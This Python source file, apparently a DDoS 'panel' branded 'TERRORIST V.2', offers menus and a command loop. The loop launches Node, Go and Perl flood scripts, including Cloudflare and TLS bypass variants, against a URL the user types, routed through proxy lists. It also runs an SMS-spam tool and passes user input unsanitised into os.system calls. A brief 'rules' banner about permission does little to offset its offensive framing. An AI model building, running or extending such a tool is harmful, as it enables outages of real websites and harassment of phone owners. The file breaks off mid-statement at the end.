# D4XG | facebook.com/d4xgg
from operator import index
import signal
import socket
import random
import string
import threading
import getpass
import urllib
import getpass
import colorama
import os,sys,time,re,requests,json
from requests import post
from time import sleep
from datetime import datetime, date
from colorama import Fore, Back, init
import pystyle
from pystyle import *
import codecs

author = "D4XG"

def prints(start_color, end_color, text):
    start_r, start_g, start_b = start_color
    end_r, end_g, end_b = end_color

    for i in range(len(text)):
        r = int(start_r + (end_r - start_r) * i / len(text))
        g = int(start_g + (end_g - start_g) * i / len(text))
        b = int(start_b + (end_b - start_b) * i / len(text))

        color_code = f"\033[38;2;{r};{g};{b}m"
        print(color_code + text[i], end="")
    
start_color = (255, 255, 255)
end_color = (0, 0, 255)

class Color:
    colorama.init()

def menu():
        os.system('cls' if os.name == 'nt' else 'clear')
        print("""
          \x1b[38;5;160m┌──────────────────────────────────────────────────────────┐  

                  ▄█    █▄       ▄████████  ▄█          ▄███████▄      
          \x1b[38;5;160m       ███    ███     ███    ███ ███         ███    ███      
          \x1b[38;5;160m       ███    ███     ███    █▀  ███         ███    ███      
          \x1b[38;5;160m      ▄███▄▄▄▄███▄▄  ▄███▄▄▄     ███         ███    ███      
          \x1b[38;5;160m     ▀▀███▀▀▀▀███▀  ▀▀███▀▀▀     ███       ▀█████████▀       
          \x1b[38;5;160m       ███    ███     ███    █▄  ███         ███             
          \x1b[38;5;160m       ███    ███     ███    ███ ███▌    ▄   ███             
          \x1b[38;5;160m       ███    █▀      ██████████ █████▄▄██  ▄████▀           
          \x1b[38;5;160m                                 ▀                    
          \x1b[38;5;160m└─────────────────────────────────────────────────────────┘   
          \x1b[38;5;160m          ║      DEVELOP BY DAXG | @daxg      ║    
          \x1b[38;5;160m     ╔═════════════════════════════════════════════╗
                          \x1b[38;5;255m[\033[0;33m#\x1b[38;5;255m] \x1b[38;5;160mHELP     \x1b[38;5;255m[\033[0;33m#\x1b[38;5;255m] \x1b[38;5;160mLAYER4   
                          \x1b[38;5;255m[\033[0;33m#\x1b[38;5;255m] \x1b[38;5;160mEXIT     \x1b[38;5;255m[\033[0;33m#\x1b[38;5;255m] \x1b[38;5;160mLAYER7 
                          \x1b[38;5;255m[\033[0;33m#\x1b[38;5;255m] \x1b[38;5;160mTOOLS    \x1b[38;5;255m[\033[0;33m#\x1b[38;5;255m] \x1b[38;5;160mRULES   
               \x1b[38;5;160m╚═════════════════════════════════════════════╝
                        HELP    ►  SHOW HELP MENU
                        LAYER4  ►  SHOW LAYER4 METHODS
                        LAYER7  ►  SHOW LAYER7 METHODS
                        TOOLS   ►  SHOW TOOL BOX
                        RULES   ►  TERRORIST RULES
                        EXIT    ►  EXIT TOOL
                        CLEAR   ►  CLEAR TERMINAL
""")

def layer7():
        os.system('cls' if os.name == 'nt' else 'clear')
        print("""               \x1b[38;5;160m╔══════════════════════════════════════════════════════════════════╗
               ║          \x1b[38;5;160m        ::::::;       ;          OOOOO                  ║
               ║          \x1b[38;5;160m        ;:::::;       ;         OOOOOOOO                ║
               ║          \x1b[38;5;160m       ,;::::::;     ;'         / OOOOOO0               ║
               ║          \x1b[38;5;160m██╗  ::::█████╗ ██╗   ██╗███████╗██████╗ ███████╗       ║
               ║          \x1b[38;5;160m██║.';::██╔══██╗╚██╗ ██╔╝██╔════╝██╔══██╗╚════██║       ║
               ║          \x1b[38;5;160m██║:::::███████║ ╚████╔╝ █████╗  ██████╔╝D000██╔╝       ║
               ║          \x1b[38;5;160m██║:::::██╔══██║  ╚██╔╝  ██╔══╝  ██╔══██╗ D0██╔╝        ║
               ║          \x1b[38;5;160m███████╗██║  ██║   ██║   ███████╗██║  ██║  D██║         ║
               ║          \x1b[38;5;160m╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝   ╚═╝         ║
               ║          \x1b[38;5;160m `:`:::::::`;:::::: ;::::::#/               DOO         ║
               ║          \x1b[38;5;160m  :::`:::::::`;; ;:::::::::##                OO         ║
               ║          \x1b[38;5;160m  ::::`:::::::`;::::::::;:::#                OO         ║
               \x1b[38;5;160m╚══════════════════════════════════════════════════════════════════╝
                    ════╦════════════════════════════════════════════════╦════
                        ║              \033[32mWELCOME TO \033[33mTERRORIST\x1b[38;5;160m              ║
                        ║   \x1b[38;5;160mTYPE\x1b[38;5;255m [ \033[32mMETHOD\x1b[38;5;255m ] [ \033[32mURL\x1b[38;5;255m ] [ \033[32mTIME\x1b[38;5;255m ]\x1b[38;5;160m TO ATTACK   ║
                    ╔═══╩════════════════════════════════════════════════╩═══╗
                    ║        ●  CHAOS  [\x1b[38;2;134;20;246mLayer7\x1b[38;5;160m]    ●  HTTP    [\x1b[38;2;134;20;246mLayer7\x1b[38;5;160m]       ║
                    ║        ●  STRESS [\x1b[38;2;134;20;246mLayer7\x1b[38;5;160m]    ●  TLS     [\x1b[38;2;134;20;246mLayer7\x1b[38;5;160m]       ║
                    ║        ●  404    [\x1b[38;2;134;20;246mLayer7\x1b[38;5;160m]    ●  CURSE   [\x1b[38;2;134;20;246mLayer7\x1b[38;5;160m]       ║
                    ║        ●  FLOOD  [\x1b[38;2;134;20;246mLayer7\x1b[38;5;160m]    ●  FLOOD2  [\x1b[38;2;134;20;246mLayer7\x1b[38;5;160m]       ║
                    ║        ●  HULK   [\x1b[38;2;134;20;246mLayer7\x1b[38;5;160m]    ●  UAM     [\x1b[38;2;134;20;246mLayer7\x1b[38;5;160m]       ║
                    ║        ●  SKYNET [\x1b[38;2;134;20;246mLayer7\x1b[38;5;160m]    ●  KILLER  [\x1b[38;2;134;20;246mLayer7\x1b[38;5;160m]       ║
                    ║        ●  SPIKE  [\x1b[38;2;134;20;246mLayer7\x1b[38;5;160m]    ●  CF      [\x1b[38;2;134;20;246mLayer7\x1b[38;5;160m]       ║
                    ╚════════════════════════════════════════════════════════╝
\033[0m""")


def tools():
        os.system('cls' if os.name == 'nt' else 'clear')
        print("""               \x1b[38;5;160m╔══════════════════════════════════════════════════════════════════╗
               ║          \x1b[38;5;160m        ::::::;       ;          OOOOO                  ║
               ║          \x1b[38;5;160m        ;:::::;       ;         OOOOOOOO                ║
               ║          \x1b[38;5;160m       ,;::::::;     ;'        / OOOOOOO                ║
               ║          \x1b[38;5;160m     ;:████████╗ ██████╗  ██████╗ ██╗OOOOO              ║
               ║          \x1b[38;5;160m   .';:╚══██╔══╝██╔═══██╗██╔═══██╗██║DOOOOOO            ║
               ║          \x1b[38;5;160m  ,::::::;██║   ██║   ██║██║   ██║██║   DOOOO           ║ 
               ║          \x1b[38;5;160m ;`::::::`██║   ██║   ██║██║   ██║██║    DOOO           ║
               ║          \x1b[38;5;160m :`:::::::██║   ╚██████╔╝╚██████╔╝███████╗ DOOO         ║
               ║          \x1b[38;5;160m ::`::::::╚═╝    ╚═════╝  ╚═════╝ ╚══════╝  DOO         ║
               ║          \x1b[38;5;160m `:`:::::::`;:::::: ;::::::#/               DOO         ║
               ║          \x1b[38;5;160m  :::`:::::::`;; ;:::::::::##                OO         ║
               ║          \x1b[38;5;160m  ::::`:::::::`;::::::::;:::#                OO         ║
               \x1b[38;5;160m╚══════════════════════════════════════════════════════════════════╝
                    ════╦════════════════════════════════════════════════╦════
                        ║                \033[33mTERRORIST TOOLS\x1b[38;5;160m                 ║
                        ║   \x1b[38;5;255mSPAMSMS\x1b[38;5;160m  |    Start a phone spam             ║
                        ║   \x1b[38;5;255mIP\x1b[38;5;160m       |    Lookup Domain/IP Infomation    ║
                        ╚════════════════════════════════════════════════╝
\033[0m""")

def layer4():
        os.system('cls' if os.name == 'nt' else 'clear')
        print("""               \x1b[38;5;160m╔══════════════════════════════════════════════════════════════════╗
               ║          \x1b[38;5;160m        ::::::;       ;          OOOOO                  ║
               ║          \x1b[38;5;160m        ;:::::;       ;         OOOOOOOO                ║
               ║          \x1b[38;5;160m       ,;::::::;     ;'         / OOOOOOO               ║
               ║          \x1b[38;5;160m██╗  ::::█████╗ ██╗   ██╗███████╗██████╗ ██╗  ██╗       ║
               ║          \x1b[38;5;160m██║.';::██╔══██╗╚██╗ ██╔╝██╔════╝██╔══██╗██║  ██║       ║
               ║          \x1b[38;5;160m██║:::::███████║ ╚████╔╝ █████╗  ██████╔╝███████║       ║
               ║          \x1b[38;5;160m██║:::::██╔══██║  ╚██╔╝  ██╔══╝  ██╔══██╗╚════██║       ║
               ║          \x1b[38;5;160m███████╗██║  ██║   ██║   ███████╗██║  ██║  DOO██║       ║
               ║          \x1b[38;5;160m╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝   DO╚═╝       ║
               ║          \x1b[38;5;160m `:`:::::::`;:::::: ;::::::#/               DOO         ║
               ║          \x1b[38;5;160m  :::`:::::::`;; ;:::::::::##                OO         ║
               ║          \x1b[38;5;160m  ::::`:::::::`;::::::::;:::#                OO         ║
               \x1b[38;5;160m╚══════════════════════════════════════════════════════════════════╝
                    ════╦════════════════════════════════════════════════╦════
                        ║              \033[32mWELCOME TO \033[33mTERRORIST\x1b[38;5;160m              ║
                        ║   \x1b[38;5;160mTYPE\x1b[38;5;255m [ \033[32mMETHOD\x1b[38;5;255m ] [ \033[32mURL\x1b[38;5;255m ] [ \033[32mTIME\x1b[38;5;255m ]\x1b[38;5;160m TO ATTACK   ║
                    ╔═══╩════════════════════════════════════════════════╩═══╗
                    ║        ●  HOME   [\x1b[38;2;134;20;246mLayer4\x1b[38;5;160m]    ●  NONE    [\x1b[38;2;134;20;246mLayer4\x1b[38;5;160m]       ║
                    ║        ●  NONE   [\x1b[38;2;134;20;246mLayer4\x1b[38;5;160m]    ●  NONE    [\x1b[38;2;134;20;246mLayer4\x1b[38;5;160m]       ║
                    ║        ●  NONE   [\x1b[38;2;134;20;246mLayer4\x1b[38;5;160m]    ●  NONE    [\x1b[38;2;134;20;246mLayer4\x1b[38;5;160m]       ║
                    ║        ●  NONE   [\x1b[38;2;134;20;246mLayer4\x1b[38;5;160m]    ●  NONE    [\x1b[38;2;134;20;246mLayer4\x1b[38;5;160m]       ║
                    ║        ●  NONE   [\x1b[38;2;134;20;246mLayer4\x1b[38;5;160m]    ●  NONE    [\x1b[38;2;134;20;246mLayer4\x1b[38;5;160m]       ║
                    ║        ●  NONE   [\x1b[38;2;134;20;246mLayer4\x1b[38;5;160m]                              ║
                    ╚════════════════════════════════════════════════════════╝
\033[0m""")

def rules():
    os.system('cls' if os.name == 'nt' else 'clear')
    print("""\033[36m
                                \x1b[38;5;160m╔═══════════════╗
                                \x1b[38;5;160m║     \x1b[38;5;160mRules     \x1b[38;5;160m║
                \x1b[38;5;160m╔═══════════════╩═══════════════╩═══════════════╗
                \x1b[38;5;160m║ \x1b[38;5;160m1. Do not attack without someone's permission \x1b[38;5;160m║
                \x1b[38;5;160m║ \x1b[38;5;160m2. Do not attack .gov/.gob/.edu/.mil domains  \x1b[38;5;160m║
                \x1b[38;5;160m║ \x1b[38;5;160m3. Do not spam attacks                        \x1b[38;5;160m║
                \x1b[38;5;160m║ \x1b[38;5;160m4. Only attack stress testing servers         \x1b[38;5;160m║
                \x1b[38;5;160m║ \x1b[38;5;160m5. Don't skid the panel                       \x1b[38;5;160m║
                \x1b[38;5;160m║ \x1b[38;5;160m6. Give a star to the github repository       \x1b[38;5;160m║
                \x1b[38;5;160m║ \x1b[38;5;160m7. The creator does not do any harm           \x1b[38;5;160m║
                \x1b[38;5;160m╚═══════════════════════════════════════════════╝
""")

def get_ip_information(query):
    api_url = f"http://ip-api.com/json/{query}?fields=status,country,countryCode,regionName,city,zip,timezone,isp,org,proxy,hosting,query"
    # CODE by D4XG | facebook.com/d4xgg
    try:
        response = requests.get(api_url)
        data = response.json()

        if data["status"] == "success":
            print("   \x1b[38;5;160m[ ! ] TERRORIST \x1b[38;5;255mIP \x1b[38;5;160mInformation:")
            print(f"     \x1b[38;5;160mIP: \x1b[38;5;255m{data['query']}")
            print(f"     \x1b[38;5;160mProxy:\x1b[38;5;255m{data['proxy']}")
            print(f"     \x1b[38;5;160mHosting: \x1b[38;5;255m{data['hosting']}")
            print(f"     \x1b[38;5;160mCountry: \x1b[38;5;255m{data['country']}")
            print(f"     \x1b[38;5;160mCountry Code: \x1b[38;5;255m{data['countryCode']}")
            print(f"     \x1b[38;5;160mRegion Name: \x1b[38;5;255m{data['regionName']}")
            print(f"     \x1b[38;5;160mCity: \x1b[38;5;255m{data['city']}")
            print(f"     \x1b[38;5;160mZip Code: \x1b[38;5;255m{data['zip']}")
            print(f"     \x1b[38;5;160mTimezone: \x1b[38;5;255m{data['timezone']}")
            print(f"     \x1b[38;5;160mISP: \x1b[38;5;255m{data['isp']}")
            print(f"     \x1b[38;5;160mOrganization: \x1b[38;5;255m{data['org']}")
        else:
            print(f"API Error: {data['message']}")
    except Exception as e:
        print(f"Error: {e}")
def main():
        os.system('cls' if os.name == 'nt' else 'clear')
        print("""              \x1b[38;5;160m                ....
              \x1b[38;5;160m              ;:::::;
              \x1b[38;5;160m            ;::::;  :;                        ________________________________
              \x1b[38;5;160m          ;:::::'    :;                     /\                               |
              \x1b[38;5;160m         ;:::::;      ;.                    \_|                              |
              \x1b[38;5;160m        ,:::::' ▄▄▄▄▄▄ ;           OOO       |  Type '\x1b[38;5;255mhelp\x1b[38;5;160m' to see them all  |
              \x1b[38;5;160m        ::::::;        ;          OOOOO      |                               |
              \x1b[38;5;160m        ;:::::;        ;         OOOOOOOO    |   ____________________________|
              \x1b[38;5;160m       ,;::::::;      ;'        / OOOOOOO     \_/____________________________/
              \x1b[38;5;160m     ;:::::::::`. ,,,;.        /  / DOOOOOO
              \x1b[38;5;160m   .';:::::::::::::::::;,     /  /     DOOOO           TERRORIST V.2
              \x1b[38;5;160m  ,::::::;::::::;;;;::::;,   /  /        DOOO
              \x1b[38;5;160m ;`::::::`'::::::;;;::::: ,#/  /          DOOO
              \x1b[38;5;160m :`:::::::`;::::::;;::: ;::#  /            DOOO
              \x1b[38;5;160m ::`:::::::`;:::::::: ;::::# /              DOO
              \x1b[38;5;160m `:`:::::::`;:::::: ;::::::#/               DOO
              \x1b[38;5;160m  :::`:::::::`;; ;:::::::::##                OO
              \x1b[38;5;160m  ::::`:::::::`;::::::::;:::#                OO
              \x1b[38;5;160m  `:::::`::::::::::::;'`:;::#                O
              \x1b[38;5;160m    `:::::`::::::::;' /  / `:#
              \x1b[38;5;160m     ::::::`:::::;'  /  /   `#")
              

       \x1b[38;5;160m    TYPE\x1b[38;5;255m  [ \x1b[38;5;255mLAYER7\x1b[38;5;255m ] \x1b[38;5;160mSHOW ALL METHODS DDOS   
\033[0m""")

        while True:
                sys.stdout.write(f"\x1b]2;[\] TERRORIST | Online Users: [∞] | Attack Sended: [∞] | Expired: [2025]\x07")
                sin = input(Fore.RED+"\x1b[38;5;160m╔═══"+Fore.RED+"\x1b[38;5;160m[""\x1b[38;5;160mroot"+Fore.RED+"@"+Fore.RED+"\x1b[38;5;160mD4XG"+Fore.RED+"\x1b[38;5;160m]"+Fore.RED+"\n\x1b[38;5;160m╚══\x1b[38;5;160m► "+Fore.WHITE)
                sinput = sin.split(" ")[0]
                if sinput == "clear":
                        os.system ("clear")
                        main()
                if sinput == "cls" or sinput == "CLS":
                        os.system ("clear")
                        main()
                if sinput == "help" or sinput == "HELP":
                        menu()
                if sinput == "layer7" or sinput == "LAYER7" or sinput == "l7" or sinput == "L7":
                        layer7()
                if sinput == "tool" or sinput == "TOOL" or sinput == "TOOLS" or sinput == "tools":
                        tools()
                if sinput == "layer4" or sinput == "LAYER4" or sinput == "l4" or sinput == "L4":
                        layer4()
                if sinput == "rule" or sinput == "RULES" or sinput == "rules" or sinput == "RULE":
                        rules()
                if sinput == "exit" or sinput == "EXIT" or sinput == "kill" or sinput == "KILL" or sinput == "shut" or sinput == "SHUT":
                        sys.exit()      
                elif sinput == "scrape" or sinput == "SCRAPE":
                        os.system(f'cd L7 && python3 scrape.py')
                elif sinput == "ip" or sinput == "IP":
                        try:
                                query = sin.split()[1]  # Assuming the IP address is the second argument
                                get_ip_information(query)
                        except IndexError:
                               print(" \x1b[38;5;160m[ ! ] Usage: \x1b[38;5;255mIP <ip/adress>")
                               print(' \x1b[38;5;160m[ ? ] Example: \x1b[38;5;255mIP 8.8.8.8')
#########LAYER-7########
                
                elif sinput == "FLOOD" or sinput == "flood":
                        try:
                                url = sin.split()[1]
                                time = sin.split()[2]
                                os.system(f'cd L7 && node FLOOD.js {url} {time} 150 10 proxy.txt bypass')
                        except ValueError:
                                print(" \x1b[38;5;160m[ ! ] Usage: FLOOD <url> <time>")
                                print(' \x1b[38;5;160m[ ? ] Example: \x1b[38;5;255mFLOOD https://example.com 120')
                        except IndexError:
                                print(" \x1b[38;5;160m[ ! ] Usage: \x1b[38;5;255mFLOOD <url> <time>")
                                print(' \x1b[38;5;160m[ ? ] Example: \x1b[38;5;255mFLOOD https://example.com 120')
                                
                elif sinput == "TLS" or sinput == "tls":
                        try:
                                url = sin.split()[1]
                                time = sin.split()[2]
                                os.system(f'cd L7 && node TLS.js {url} {time} 100 8 proxy.txt')
                        except ValueError:
                                print(" \x1b[38;5;160m[ ! ] Usage: TLS <url> <time>")
                                print(' \x1b[38;5;160m[ ? ] Example: \x1b[38;5;255mTLS https://example.com 120')
                        except IndexError:
                                print(" \x1b[38;5;160m[ ! ] Usage: \x1b[38;5;255mTLS <url> <time>")
                                print(' \x1b[38;5;160m[ ? ] Example: \x1b[38;5;255mTLS https://example.com 120')
                
                elif sinput == "FLOOD2" or sinput == "flood2":
                        try:
                                url = sin.split()[1]
                                time = sin.split()[2]
                                os.system(f'cd L7 && node FLOOD2.js {url} {time} 200 8 proxy.txt bypass')
                        except ValueError:
                                print(" \x1b[38;5;160m[ ! ] Usage: \x1b[38;5;255mFLOOD2 <url> <time>")
                                print(' \x1b[38;5;160m[ ? ] Example: \x1b[38;5;255mFLOOD2 https://example.com 120')
                        except IndexError:
                                print(" \x1b[38;5;160m[ ! ] Usage: \x1b[38;5;255mFLOOD2 <url> <time>")
                                print(' \x1b[38;5;160m[ ? ] Example: \x1b[38;5;255mFLOOD2 https://example.com 120')
                 
                elif sinput == "HOME" or sinput == "home":
                        try:
                                url = sin.split()[1]
                                port = sin.split()[2]
                                time = sin.split()[3]
                                os.system(f'cd L4 && perl home.pl {url} {port} 65500 {time}')
                        except ValueError:
                                print(" \x1b[38;5;160m[ ! ] Usage: \x1b[38;5;255mHOME <ip> <port> <time>")
                                print(' \x1b[38;5;160m[ ? ] Example: \x1b[38;5;255mHOME 1.1.1.1 433')
                        except IndexError:
                                print(" \x1b[38;5;160m[ ! ] Usage: \x1b[38;5;255mHOME <ip> <port> <time>")
                                print(' \x1b[38;5;160m[ ? ] Example: \x1b[38;5;255mHOME 1.1.1.1 433')

                elif sinput == "CURSE" or sinput == "curse":
                        try:
                                url = sin.split()[1]
                                time = sin.split()[2]
                                os.system(f'cd L7 && node CURSE.js {url} {time} 3 64 proxy.txt')
                        except ValueError:
                                print(" \x1b[38;5;160m[ ! ] Usage: \x1b[38;5;255mCURSE <url> <time>")
                                print(' \x1b[38;5;160m[ ? ] Example: \x1b[38;5;255mCURSE https://example.com 120')
                        except IndexError:
                                print(" \x1b[38;5;160m[ ! ] Usage: \x1b[38;5;255mCURSE <url> <time>")
                                print(' \x1b[38;5;160m[ ? ] Example: \x1b[38;5;255mCURSE https://example.com 120')
                
                elif sinput == "SPIKE" or sinput == "spike":
                        try:
                                url = sin.split()[1]
                                time = sin.split()[2]
                                thread = sin.split()[3]
                                os.system(f'cd L7 && node SPIKE.js {url} {thread} {time}')
                        except ValueError:
                                print(" \x1b[38;5;160m[ ! ] Usage: \x1b[38;5;255mSPIKE <url> <threads> <time>")
                                print(' \x1b[38;5;160m[ ? ] Example: \x1b[38;5;255mSPIKE https://example.com 20 120')
                        except IndexError:
                                print(" \x1b[38;5;160m[ ! ] Usage: \x1b[38;5;255mSPIKE <url> <threads> <time>")
                                print(' \x1b[38;5;160m[ ? ] Example: \x1b[38;5;255mSPIKE https://example.com 20 120')
                        
                elif sinput == "CHAOS" or sinput == "chaos":
                        try:
                                url = sin.split()[1]
                                time = sin.split()[2]
                                os.system(f'cd L7 && node CHAOS.js {url} {time} 250 8 proxy.txt')
                        except ValueError:
                                print(" \x1b[38;5;160m[ ! ] Usage: \x1b[38;5;255mCHAOS <url> <time>")
                                print(' \x1b[38;5;160m[ ? ] Example: \x1b[38;5;255mCHAOS https://example.com 120')
                        except IndexError:
                                print(" \x1b[38;5;160m[ ! ] Usage: \x1b[38;5;255mCHAOS <url> <time>")
                                print(' \x1b[38;5;160m[ ? ] Example: \x1b[38;5;255mCHAOS https://example.com 120')

                elif sinput == "KILLER" or sinput == "killer":
                        try:
                                url = sin.split()[1]
                                time = sin.split()[2]
                                os.system(f'cd L7 && node KILLER.js {url} {time} 100 8 proxy.txt')
                        except ValueError:
                                print(" \x1b[38;5;160m[ ! ] Usage: \x1b[38;5;255mKILLER <url> <time>")
                                print(' \x1b[38;5;160m[ ? ] Example: \x1b[38;5;255mKILLER https://example.com 120')
                        except IndexError:
                                print(" \x1b[38;5;160m[ ! ] Usage: \x1b[38;5;255mKILLER <url> <time>")
                                print(' \x1b[38;5;160m[ ? ] Example: \x1b[38;5;255mKILLER https://example.com 120')
    
                elif sinput == "HULK" or sinput == "hulk":
                        try:
                                url = sin.split()[1]
                                method = sin.split()[2]
                                os.system(f'cd L7 && go run HULK.go -site {url} {method} nil')
                        except ValueError:
                                print(" \x1b[38;5;160m[ ! ] Usage: \x1b[38;5;255mHULK <url> <GET/POST>")
                                print(' \x1b[38;5;160m[ ? ] Example: \x1b[38;5;255mHULK https://example.com GET')
                        except IndexError:
                                print(" \x1b[38;5;160m[ ! ] Usage: \x1b[38;5;255mHULK <url> <GET/POST>")
                                print(' \x1b[38;5;160m[ ? ] Example: \x1b[38;5;255mHULK https://example.com GET')

                elif sinput == "UAM" or sinput == "uam":
                        try:
                                url = sin.split()[1]
                                time = sin.split()[2]
                                os.system(f'cd L7 && node UAM.js {url} {time} 150')
                        except ValueError:
                                print(" \x1b[38;5;160m[ ! ] Usage: \x1b[38;5;255mUAM <url> <time>")
                                print(' \x1b[38;5;160m[ ? ] Example: \x1b[38;5;255mUAM https://example.com 120')
                        except IndexError:
                                print(" \x1b[38;5;160m[ ! ] Usage: \x1b[38;5;255mUAM <url> <time>")
                                print(' \x1b[38;5;160m[ ? ] Example: \x1b[38;5;255mUAM https://example.com 120')

                elif sinput == "SKYNET" or sinput == "skynet":
                        try:
                                url = sin.split()[1]
                                time = sin.split()[2]
                                os.system(f'cd L7 && node SKYNET.js {url} {time} 200 8 proxies.txt')
                        except ValueError:
                                print(" \x1b[38;5;160m[ ! ] Usage: \x1b[38;5;255mSKYNET <url> <time>")
                                print(' \x1b[38;5;160m[ ? ] Example: \x1b[38;5;255mSKYNET https://example.com 120')
                        except IndexError:
                                print(" \x1b[38;5;160m[ ! ] Usage: \x1b[38;5;255mSKYNET <url> <time>")
                                print(' \x1b[38;5;160m[ ? ] Example: \x1b[38;5;255mSKYNET https://example.com 120')

                elif sinput == "404" or sinput == "404":
                        try:
                                url = sin.split()[1]
                                time = sin.split()[2]
                                os.system(f'cd L7 && node 404.js {url} {time} 80 15 proxy.txt')
                        except ValueError:
                                print(" \x1b[38;5;160m[ ! ] Usage: \x1b[38;5;255m404 <url> <time>")
                                print(' \x1b[38;5;160m[ ? ] Example: \x1b[38;5;255m404 https://example.com 120')
                        except IndexError:
                                print(" \x1b[38;5;160m[ ! ] Usage: \x1b[38;5;255m404 <url> <time>")
                                print(' \x1b[38;5;160m[ ? ] Example: \x1b[38;5;255m404 https://example.com 120')
                                
                elif sinput == "CF" or sinput == "cf":
                        try:
                                url = sin.split()[1]
                                time = sin.split()[2]
                                os.system(f'cd L7 && node CF.js {url} {time} 150 10 proxy.txt')
                        except ValueError:
                                print(" \x1b[38;5;160m[ ! ] Usage: \x1b[38;5;255mCF <url> <time>")
                                print(' \x1b[38;5;160m[ ? ] Example: \x1b[38;5;255mCF https://example.com 120')
                        except IndexError:
                                print(" \x1b[38;5;160m[ ! ] Usage: \x1b[38;5;255mCF <url> <time>")
                                print(' \x1b[38;5;160m[ ? ] Example: \x1b[38;5;255mCF https://example.com 120')

                elif sinput == "SPAMSMS" or sinput == "spamsms":
                        try:
                                os.system(f'cd AA && python spamsms.py')
                        except ValueError:
                                print(" \x1b[38;5;160m[ ! ] Usage: SPAMSMS")
                                print(' \x1b[38;5;160m[ ? ] Example: SPAMSMS')
                        except IndexError:
                                print(" \x1b[38;5;160m[ ! ] Usage: SPAMSMS")
                                print(' \x1b[38;5;160m[ ? ] Example: SPAMSMS')
        
                elif sinput == "HTTP-STRESS" or sinput == "http-stress":
                        try:
                                url = sin.split()[1]
                                time = sin.split()[2]
                                os.system(f'cd L7 && node STRESS.js {url} {time} 250 8 proxy.txt')
                        except ValueError:
                                print(" \x1b[38;5;160m[ ! ] Usage: \x1b[38;5;255mHTTP-STRESS <url> <time>")
                                print(' \x1b[38;5;160m[ ? ] Example: \x1b[38;5;255mHTTP-STRESS https://example.com 120')
                        except IndexError:
                                print(" \x1b[38;5;160m[ ! ] Usage: \x1b[38;5;255mHTTP-STRESS <url> <time>")
                                print(' \x1b[38;5;160m[ ? ] Example: \x1b[38;5;255mHTTP-STRESS https://example.com 120')

                elif sinput == "TLS-FLOOD" or sinput == "tls-flood":
                        try:
                                url = sin.split()[1]
                                time = sin.split()[2]
                                os.system(f'cd L7 && node TLS-FLOOD.js {url} {time} 64 10 proxy.txt')
                        except ValueError:
                                print(" \x1b[38;5;160m[ ! ] Usage: \x1b[38;5;255mTLS-FLOOD <url> <time>")
                                print(' \x1b[38;5;160m[ ? ] Example: \x1b[38;5;255mTLS-FLOOD https://example.com 120')
                        except IndexError:
                                print(" \x1b[38;5;160m[ ! ] Usage: \x1b[38;5;255mTLS-FLOOD <url> <time>")
                                print(' \x1b[38;5;160m[ ? ] Example: \x1b[38;5;255mTLS-FLOOD https://example.com 120')
        
                elif sinput == "http" or sinput == "HTTP":
                        try:
                                url = sin.split()[1]
                                time = sin.split()[2]
                                os.system(f'cd L7 && node HTTP.js {url} {time} 250 8 proxies.txt')
                                os.system ("clear")
                        except ValueError:
                                print(" \x1b[38;5;160m[ ! ] Usage: \x1b[38;5;255mHTTP <url> <time>")
                                print(' \x1b[38;5;160m[ ? ] Example: \x1b[38;5;255mHTTP https://example.com 120')
                        except IndexError:
                                print(" \x1b[38;5;160m[ ! ] Usage: \x1b[38;5;255mHTTP <url> <time>")
                                print(' \x1b[38;5;160m[ ? ] Example: \x1b[38;5;255mHTTP https://example.com 120')

                elif sinput == "HTTP-LOAD" or sinput == "http-load":
                        try:
                                url = sin.split()[1]
                                time = sin.split()[2]
                                os.system(f'cd VIP && node HTTP-MARS.js {url} {time} 64 10 proxy.txt')
                                os.system ("clear")
                        except ValueError:
                                print(" \x1b[38;5;160m[ ! ] Usage: \x1b[38;5;255mHTTP-LOAD <url> <time>")
                                print(' \x1b[38;5;160m[ ? ] Example: \x1b[38;5;255mHTTP-LOAD https://example.com 120')
                        except IndexError:
                                print(" \x1b[38;5;160m[ ! ] Usage: \x1b[38;5;255mHTTP-LOAD <url> <time>")
                                print(' \x1b[38;5;160m[ ? ] Example: \x1b[38;5;255mHTTP-LOAD https://example.com 120')

                elif sinput == "STRESS" or sinput == "stress":
                        try:
                                url = sin.split()[1]
                                port = sin.split()[2]
                                time = sin.split()[3]
                                os.system(f'cd L4 && go run STRESS.go {url} {port} 3 2000 {time} {time}')
                        except ValueError:
                                print(" \x1b[38;5;160m[ ! ] Usage: \x1b[38;5;255mSTRESS <url> <port> <time>")
                                print(' \x1b[38;5;160m[ ? ] Example: \x1b[38;5;255mSTRESS https://example.com 443 120')
                        except IndexError:
                                print(" \x1b[38;5;160m[ ! ] Usage: \x1b[38;5;255mSTRESS <url> <port>")
                                print(' \x1b[38;5;160m[ ? ] Example: \x1b[38;5;255mSTRESS https://example.com 443 120')

                elif sinput == "UAMCFL" or sinput == "uamcfl":
                        try:
                                url = sin.split()[1]
                                time = sin.split()[2]
                                os.system(f'cd VIP && node BYPASS.js {url} {time} 64 10 proxy.txt')
                        except ValueError:
                                print(" \x1b[38;5;160m[ ! ] Usage: \x1b[38;5;255mUAMCFL <url> <time>")
                                print(' \x1b[38;5;160m[ ? ] Example: \x1b[38;5;255mUAMCFL https://example.com 120')
                        except IndexError:
                                print(" \x1b[38;5;160m[ ! ] Usage: \x1b[38;5;255mUAMCFL <url> <time>")
                                print(' \x1b[38;5;160m[ ? ] Example: \x1b[38;5;255mUAMCFL https://example.com 120')

                elif sinput == "TLS-BYPASS" or sinput == "tls-bypass":
                        try:
                                url = sin.split()[1]
                                time = sin.split()[2]
                                os.system(f'cd VIP && node TLS-VIP.js {url} {time} 64 10 proxy.txt')
                        except ValueError:
                                print(" \x1b[38;5;160m[ ! ] Usage: \x1b[38;5;255mTLS-BYPASS <url> <time>")
                                print(' \x1b[38;5;160m[ ? ] Example: \x1b[38;5;255mTLS-BYPASS https://example.com 120')
                        except IndexError:
                                print(" \x1b[38;5;160m[ ! ] Usage: \x1b[38;5;255mTLS-BYPASS <url> <time>")
                                print(' \x1b[38;5;160m[ ? ] Example: \x1b[38;5;255mTLS-BYPASS https://example.com 120')

                else:
                        try:
                                cmd=sin.split()[0]
                                excluded_keywords = ["cls", "help", "HELP", "RULES", "rules", "rule", "RULE", "kill", "KILL", "exit", "EXIT", "l4", "L4", "layer4", "LAYER4", "l7", "L7", "layer7", "LAYER7", "tool", "tools", "TOOL", "TOOLS", "shut", "SHUT"]
                                
                                if cmd not in excluded_keywords:
